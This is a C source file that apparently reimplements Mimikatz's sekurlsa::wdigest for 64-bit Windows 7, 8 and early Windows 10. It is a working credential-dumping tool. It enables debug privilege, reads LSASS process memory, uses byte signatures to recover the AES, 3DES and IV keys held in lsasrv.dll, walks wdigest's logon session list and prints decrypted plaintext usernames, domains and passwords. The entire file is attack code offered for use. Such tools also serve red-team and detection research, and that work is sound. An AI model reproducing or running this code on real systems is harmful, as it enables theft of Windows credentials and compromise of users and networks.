#define WIN32_NO_STATUS
#define SECURITY_WIN32

#include <windows.h>
#include <psapi.h>
#include <ntsecapi.h>
#include <sspi.h>
#include <sddl.h>
#include <wincred.h>
#include <ntsecapi.h>
#include <ntsecpkg.h>
#include <stdio.h>
#include <bcrypt.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#pragma comment(lib,"Bcrypt.lib") 
#pragma comment(lib,"psapi.lib")
#pragma comment(lib, "advapi32.lib")

//** Offsets and Structs credited to Mimikatz **/

typedef struct _KIWI_WDIGEST_LIST_ENTRY {
	struct _KIWI_WDIGEST_LIST_ENTRY* Flink;
	struct _KIWI_WDIGEST_LIST_ENTRY* Blink;
	ULONG	UsageCount;
	struct _KIWI_WDIGEST_LIST_ENTRY* This;
	LUID LocallyUniqueIdentifier;

	UNICODE_STRING UserName; // 0x30
	UNICODE_STRING Domaine;  // 0x40
	UNICODE_STRING Password; // 0x50
} KIWI_WDIGEST_LIST_ENTRY, *PKIWI_WDIGEST_LIST_ENTRY;

typedef struct _KIWI_HARD_KEY {
	ULONG cbSecret;
	BYTE data[60]; // etc...
} KIWI_HARD_KEY, *PKIWI_HARD_KEY;


typedef struct _KIWI_BCRYPT_KEY {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG bits;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY, *PKIWI_BCRYPT_KEY;

typedef struct _KIWI_BCRYPT_KEY81 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2;
	ULONG unk3;
	ULONG unk4;
	PVOID unk5;	// before, align in x64
	ULONG unk6;
	ULONG unk7;
	ULONG unk8;
	ULONG unk9;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, *PKIWI_BCRYPT_KEY81;

typedef struct _KIWI_BCRYPT_HANDLE_KEY {
	ULONG size;
	ULONG tag;	// 'UUUR'
	PVOID hAlgorithm;
	PKIWI_BCRYPT_KEY81 key;
	PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, *PKIWI_BCRYPT_HANDLE_KEY;

// Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
unsigned char logSessListSig[] = { 0x48, 0x3b, 0xd9, 0x74 };


#define USERNAME_OFFSET 0x30
#define HOSTNAME_OFFSET 0x40
#define PASSWORD_OFFSET 0x50

//* End structs and offsets *//

// Holds extracted InitializationVector
unsigned char gInitializationVector[16];

// Holds extracted 3DES key
unsigned char gDesKey[24];

// Holds extracted AES key
unsigned char gAesKey[16];

// Decrypt wdigest cached credentials using AES or 3Des 
ULONG DecryptCredentials(char* encrypedPass, DWORD encryptedPassLen, unsigned char* decryptedPass, ULONG decryptedPassLen) {
	BCRYPT_ALG_HANDLE hProvider, hDesProvider;
	BCRYPT_KEY_HANDLE hAes, hDes;
	ULONG result;
	NTSTATUS status;
	unsigned char initializationVector[16];

	// Same IV used for each cred, so we need to work on a local copy as this is updated
	// each time by BCryptDecrypt
	memcpy(initializationVector, gInitializationVector, sizeof(gInitializationVector));

	if (encryptedPassLen % 8) {
		// If suited to AES, lsasrv uses AES in CFB mode
		printf("[-->] AES\n");
		BCryptOpenAlgorithmProvider(&hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
		BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
		BCryptGenerateSymmetricKey(hProvider, &hAes, NULL, 0, gAesKey, sizeof(gAesKey), 0);
		status = BCryptDecrypt(hAes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, sizeof(gInitializationVector), decryptedPass, decryptedPassLen, &result, 0);
		if (status != 0) {
			return 0;
		}
		return result;
	}
	else {
		// If suited to 3DES, lsasrv uses 3DES in CBC mode
		printf("[-->] 3DES\n");
		BCryptOpenAlgorithmProvider(&hDesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
		BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
		BCryptGenerateSymmetricKey(hDesProvider, &hDes, NULL, 0, gDesKey, sizeof(gDesKey), 0);
		status = BCryptDecrypt(hDes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, 8, decryptedPass, decryptedPassLen, &result, 0);
		if (status != 0) {
			return 0;
		}
		return result;
	}
}

// Read memory from LSASS process
SIZE_T ReadFromLsass(HANDLE hLsass, void* addr, void *memOut, int memOutLen) {
	SIZE_T bytesRead = 0;

	memset(memOut, 0, memOutLen);
	ReadProcessMemory(hLsass, addr, memOut, memOutLen, &bytesRead);

	return bytesRead;
}

// Open a handle to the LSASS process
HANDLE GrabLsassHandle(int pid) {
	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	return procHandle;
}

// Searches for a provided pattern in memory and returns the offset
DWORD SearchPattern(unsigned char* mem, unsigned char* signature, DWORD signatureLen) {
	ULONG offset = 0;

	// Hunt for signature locally to avoid a load of RPM calls
	for (int i = 0; i < 0x200000; i++) {
		if (*(unsigned char*)(mem + i) == signature[0] && *(unsigned char*)(mem + i + 1) == signature[1]) {
			if (memcmp(mem + i, signature, signatureLen) == 0) {
				// Found the signature
				offset = i;
				break;
			}
		}
	}

	return offset;
}

// Recoveres AES, 3DES and IV from lsass memory required to decrypt wdigest credentials
int FindKeysOnWin7(HANDLE hLsass, char* lsasrvMem) {
	BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d };
	int IV_OFFSET = 59;
	int DES_OFFSET = -61;
	int AES_OFFSET = 25;

	DWORD keySigOffset = 0;
	DWORD ivOffset = 0;
	DWORD desOffset = 0, aesOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY h3DesKey, hAesKey;
	KIWI_BCRYPT_KEY extracted3DesKey, extractedAesKey;
	void* keyPointer = NULL;

	// Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
	unsigned char *lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
	if (lsasrvLocal == (unsigned char*)0) {
		printf("[x] Error: Could not load lsasrv.dll locally\n");
		return 1;
	}
	printf("[*] Loaded lsasrv.dll locally at address %p\n", lsasrvLocal);

	// Search for AES/3Des/IV signature within lsasrv.dll and grab the offset
	keySigOffset = SearchPattern(lsasrvLocal, PTRN_WNO8_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY));
	if (keySigOffset == 0) {
		printf("[x] Error: Could not find offset to AES/3Des/IV keys\n");
		return 1;
	}
	printf("[*] Found offset to AES/3Des/IV at %d\n", keySigOffset);

	// Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET, (char*)&ivOffset, 4);
	printf("[*] InitializationVector offset found as %d\n", ivOffset);

	// Read InitializationVector (16 bytes)
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET + 4 + ivOffset, gInitializationVector, 16);

	printf("[*] InitializationVector recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	for (int i = 0; i < 16; i++) {
		printf("%02x ", gInitializationVector[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET, &desOffset, 4);
	printf("[*] h3DesKey offset found as %d\n", desOffset);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET + 4 + desOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in the 3DES key
	ReadFromLsass(hLsass, h3DesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] 3Des Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gDesKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gDesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET, &aesOffset, 4);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET + 4 + aesOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in AES key
	ReadFromLsass(hLsass, hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] Aes Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gAesKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extractedAesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gAesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	return 0;
}


// Recoveres AES, 3DES and IV from lsass memory required to decrypt wdigest credentials
int FindKeysOnWin8(HANDLE hLsass, char* lsasrvMem) {
	BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d };
	int IV_OFFSET = 62;
	int DES_OFFSET = -70;
	int AES_OFFSET = 23;

	DWORD keySigOffset = 0;
	DWORD ivOffset = 0;
	DWORD desOffset = 0, aesOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY h3DesKey, hAesKey;
	KIWI_BCRYPT_KEY81 extracted3DesKey, extractedAesKey;
	void* keyPointer = NULL;

	// Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
	unsigned char *lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
	if (lsasrvLocal == (unsigned char*)0) {
		printf("[x] Error: Could not load lsasrv.dll locally\n");
		return 1;
	}
	printf("[*] Loaded lsasrv.dll locally at address %p\n", lsasrvLocal);

	// Search for AES/3Des/IV signature within lsasrv.dll and grab the offset
	keySigOffset = SearchPattern(lsasrvLocal, PTRN_WIN8_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY));
	if (keySigOffset == 0) {
		printf("[x] Error: Could not find offset to AES/3Des/IV keys\n");
		return 1;
	}
	printf("[*] Found offset to AES/3Des/IV at %d\n", keySigOffset);

	// Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET, (char*)&ivOffset, 4);
	printf("[*] InitializationVector offset found as %d\n", ivOffset);

	// Read InitializationVector (16 bytes)
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET + 4 + ivOffset, gInitializationVector, 16);

	printf("[*] InitializationVector recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	for (int i = 0; i < 16; i++) {
		printf("%02x ", gInitializationVector[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET, &desOffset, 4);
	printf("[*] h3DesKey offset found as %d\n", desOffset);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET + 4 + desOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in the 3DES key
	ReadFromLsass(hLsass, h3DesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] 3Des Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gDesKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gDesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET, &aesOffset, 4);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET + 4 + aesOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in AES key
	ReadFromLsass(hLsass, hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] Aes Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gAesKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extractedAesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gAesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	return 0;
}

// Recoveres AES, 3DES and IV from lsass memory required to decrypt wdigest credentials
// before Win10_1903
int FindKeysOnWin10(HANDLE hLsass, char* lsasrvMem) {
	BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
	int IV_OFFSET = 61;
	int DES_OFFSET = -73;
	int AES_OFFSET = 16;

	DWORD keySigOffset = 0;
	DWORD ivOffset = 0;
	DWORD desOffset = 0, aesOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY h3DesKey, hAesKey;
	KIWI_BCRYPT_KEY81 extracted3DesKey, extractedAesKey;
	void* keyPointer = NULL;

	// Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
	unsigned char *lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
	if (lsasrvLocal == (unsigned char*)0) {
		printf("[x] Error: Could not load lsasrv.dll locally\n");
		return 1;
	}
	printf("[*] Loaded lsasrv.dll locally at address %p\n", lsasrvLocal);

	// Search for AES/3Des/IV signature within lsasrv.dll and grab the offset
	keySigOffset = SearchPattern(lsasrvLocal, PTRN_WN10_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
	if (keySigOffset == 0) {
		printf("[x] Error: Could not find offset to AES/3Des/IV keys\n");
		return 1;
	}
	printf("[*] Found offset to AES/3Des/IV at %d\n", keySigOffset);

	// Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET, (char*)&ivOffset, 4);
	printf("[*] InitializationVector offset found as %d\n", ivOffset);

	// Read InitializationVector (16 bytes)
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET + 4 + ivOffset, gInitializationVector, 16);

	printf("[*] InitializationVector recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	for (int i = 0; i < 16; i++) {
		printf("%02x ", gInitializationVector[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET, &desOffset, 4);
	printf("[*] h3DesKey offset found as %d\n", desOffset);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET + 4 + desOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in the 3DES key
	ReadFromLsass(hLsass, h3DesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] 3Des Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gDesKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gDesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET, &aesOffset, 4);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET + 4 + aesOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in AES key
	ReadFromLsass(hLsass, hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] Aes Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gAesKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extractedAesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gAesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	return 0;
}

// Reads out a LSA_UNICODE_STRING from lsass address provided
UNICODE_STRING *ExtractUnicodeString(HANDLE hLsass, char* addr) {
	UNICODE_STRING *str;
	WORD* mem;

	str = (UNICODE_STRING*)LocalAlloc(LPTR, sizeof(UNICODE_STRING));

	// Read LSA_UNICODE_STRING from lsass memory
	ReadFromLsass(hLsass, addr, str, sizeof(UNICODE_STRING));

	mem = (WORD*)LocalAlloc(LPTR, str->MaximumLength);
	if (mem == (WORD*)0) {
		LocalFree(str);
		return NULL;
	}

	// Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
	ReadFromLsass(hLsass, *(void**)((char*)str + 8), mem, str->MaximumLength);
	str->Buffer = (PWSTR)mem;
	return str;
}

// Free memory allocated within getUnicodeString
void FreeUnicodeString(UNICODE_STRING* unicode) {
	LocalFree(unicode->Buffer);
	LocalFree(unicode);
}

// Hunts through wdigest and extracts credentials to be decrypted
int FindCredentials(HANDLE hLsass, char* wdigestMem) {

	KIWI_WDIGEST_LIST_ENTRY entry;
	DWORD logSessListSigOffset, logSessListOffset;
	unsigned char* logSessListAddr;
	unsigned char* wdigestLocal;
	unsigned char* llCurrent, *llStart;
	unsigned char passDecrypted[1024];

	// Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
	wdigestLocal = (unsigned char*)LoadLibraryA("wdigest.dll");
	if (wdigestLocal == NULL) {
		printf("[x] Error: Could not load wdigest.dll into local process\n");
		return 1;
	}
	printf("[*] Loaded wdigest.dll at address %p\n", wdigestLocal);

	// Search for l_LogSessList signature within wdigest.dll and grab the offset
	logSessListSigOffset = SearchPattern(wdigestLocal, logSessListSig, sizeof(logSessListSig));
	if (logSessListSigOffset == 0) {
		printf("[x] Error: Could not find l_LogSessList signature\n");
		return 1;
	}
	printf("[*] l_LogSessList offset found as %d\n", logSessListSigOffset);

	// Read memory offset to l_LogSessList from a "lea reg, [l_LogSessList]" asm
	ReadFromLsass(hLsass, wdigestMem + logSessListSigOffset - 4, &logSessListOffset, sizeof(DWORD));

	// Read pointer at address to get the true memory location of l_LogSessList
	ReadFromLsass(hLsass, wdigestMem + logSessListSigOffset + logSessListOffset, &logSessListAddr, sizeof(char*));

	printf("[*] l_LogSessList found at address %p\n", logSessListAddr);
	printf("[*] Credentials incoming... (hopefully)\n\n");

	// Read first entry from linked list
	ReadFromLsass(hLsass, logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

	llCurrent = (unsigned char*)entry.This;

	do {
		memset(&entry, 0, sizeof(entry));

		// Read entry from linked list
		ReadFromLsass(hLsass, llCurrent, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

		if (entry.UsageCount == 1) {

			UNICODE_STRING* username = ExtractUnicodeString(hLsass, (char*)llCurrent + USERNAME_OFFSET);
			UNICODE_STRING * hostname = ExtractUnicodeString(hLsass, (char*)llCurrent + HOSTNAME_OFFSET);
			UNICODE_STRING * password = ExtractUnicodeString(hLsass, (char*)llCurrent + PASSWORD_OFFSET);

			if (username != NULL && username->Length != 0) {
				printf("\n[-->] Username: %ls\n", username->Buffer);
			}
			else {
				printf("\n[-->] Username: [NULL]\n");
			}

			if (hostname != NULL && hostname->Length != 0) {
				printf("[-->] Hostname: %ls\n", hostname->Buffer);
			}
			else {
				printf("[-->] Hostname: [NULL]\n");
			}

			// Check if password is present
			if (password->Length != 0 && (password->Length % 2) == 0) {

				// Decrypt password using recovered AES/3Des keys and IV
				if (DecryptCredentials((char*)password->Buffer, password->MaximumLength, passDecrypted, sizeof(passDecrypted)) > 0) {
					printf("[-->] Password: %ls\n\n", passDecrypted);
				}

			}
			else {
				printf("[-->] Password: [NULL]\n\n");
			}

			FreeUnicodeString(username);
			FreeUnicodeString(hostname);
			FreeUnicodeString(password);
		}

		llCurrent = (unsigned char*)entry.Flink;
	} while (llCurrent != logSessListAddr);

	return 0;
}

// Searches for lsass.exe PID
int GetLsassPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}



int GetOSVersion()
{
	typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
	HINSTANCE hinst = LoadLibrary(L"ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber;
	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
	proc(&dwMajor, &dwMinor, &dwBuildNumber);

	if (dwMajor == 10 && dwMinor == 0) {
		printf("[*] OS: Windows 10\n");
		return 3;
	}

	SYSTEM_INFO info;
	GetSystemInfo(&info);
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if (GetVersionEx((OSVERSIONINFO *)&os))
	{
		switch (os.dwMajorVersion)
		{
		case 6:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION) {
					printf("[*] OS: Windows Vista\n");
					return 1;
				}

				else {
					printf("[*] OS: Windows Server 2008\n");
					return 1;
				}

			case 1:
				if (os.wProductType == VER_NT_WORKSTATION)
					printf("[*] OS: Windows 7\n");
				else
					printf("[*] OS:Windows Windows Server 2008 R2\n");
				return 1;

			case 2:
				if (os.wProductType == VER_NT_WORKSTATION)
					printf("[*] OS: Windows 8\n");
				else
					printf("[*] OS: Windows Server 2012\n");
				return 2;
			}
			break;
		default:
			printf("[!] Too old\n");

		}
	}
	else
		printf("[!] Error\n");
	return 0;
}

int main()
{
	printf("\nUse to get plain-text credentials of the 64-bit OS.\n");
	printf("This is a simple implementation of Mimikatz's sekurlsa::wdigest\n\n");
	printf("Support:\n");
	printf(" - Win7 x64/Windows Server 2008 x64/Windows Server 2008R2 x64\n");
	printf(" - Win8 x64/Windows Server 2012 x64/Windows Server 2012R2 x64\n");
	printf(" - Win10_1507(and before 1903) x64\n\n");
	printf("Source: https://gist.github.com/xpn/12a6907a2fce97296428221b3bd3b394 \n");
	printf("The following functions have been added:\n");
	printf(" - EnableDebugPrivilege\n");
	printf(" - GetOSVersion\n");
	printf(" - Support different OS\n\n");
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
	}

	HANDLE hLsass;
	HMODULE lsassDll[1024];
	DWORD bytesReturned;
	char modName[MAX_PATH];
	char* lsass = NULL, *lsasrv = NULL, *wdigest = NULL;

	// Open up a PROCESS_QUERY_INFORMATION | PROCESS_VM_READ handle to lsass process
	hLsass = GrabLsassHandle(GetLsassPid());
	if (hLsass == INVALID_HANDLE_VALUE) {
		printf("[x] Error: Could not open handle to lsass process\n");
		return 1;
	}

	// Enumerate all loaded modules within lsass process
	if (EnumProcessModules(hLsass, lsassDll, sizeof(lsassDll), &bytesReturned)) {

		// For each DLL address, get its name so we can find what we are looking for
		for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {
			GetModuleFileNameExA(hLsass, lsassDll[i], modName, sizeof(modName));

			// Find DLL's we want to hunt for signatures within
			if (strstr(modName, "lsass.exe") != (char*)0)
				lsass = (char*)lsassDll[i];
			else if (strstr(modName, "wdigest.DLL") != (char*)0)
				wdigest = (char*)lsassDll[i];
			else if (strstr(modName, "lsasrv.dll") != (char*)0)
				lsasrv = (char*)lsassDll[i];
		}
	}
	else
	{
		printf("[!]Error code of EnumProcessModules():%d\n", GetLastError());
		return 0;
	}

	// Make sure we have all the DLLs that we require
	if (lsass == NULL || wdigest == NULL || lsasrv == NULL) {
		printf("[x] Error: Could not find all DLL's in LSASS :(\n");
		return 1;
	}
	printf("[*] lsass.exe found at %p\n", lsass);
	printf("[*] wdigest.dll found at %p\n", wdigest);
	printf("[*] lsasrv.dll found at %p\n", lsasrv);

	// Now we need to search through lsass for the AES, 3DES, and IV values
	int flag = GetOSVersion();
	if (flag == 0)
		return 0;

	else if (flag == 1) {
		if (FindKeysOnWin7(hLsass, lsasrv) != 0) {

			printf("[x] Error: Could not find keys in lsass\n");
			return 1;
		}
	}

	else if (flag == 2) {
		BYTE keyIVSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d };
		if (FindKeysOnWin8(hLsass, lsasrv) != 0) {
			printf("[x] Error: Could not find keys in lsass\n");
			return 1;
		}
	}

	else if (flag == 3) {
		//For Win10_1507
		if (FindKeysOnWin10(hLsass, lsasrv) != 0) {
			printf("[x] Error: Could not find keys in lsass\n");
			return 1;
		}
	}
	// With keys extracted, we can extract credentials from memory
	if (FindCredentials(hLsass, wdigest) != 0) {
		printf("[x] Error: Could not find credentials in lsass\n");
		return 1;
	}
}
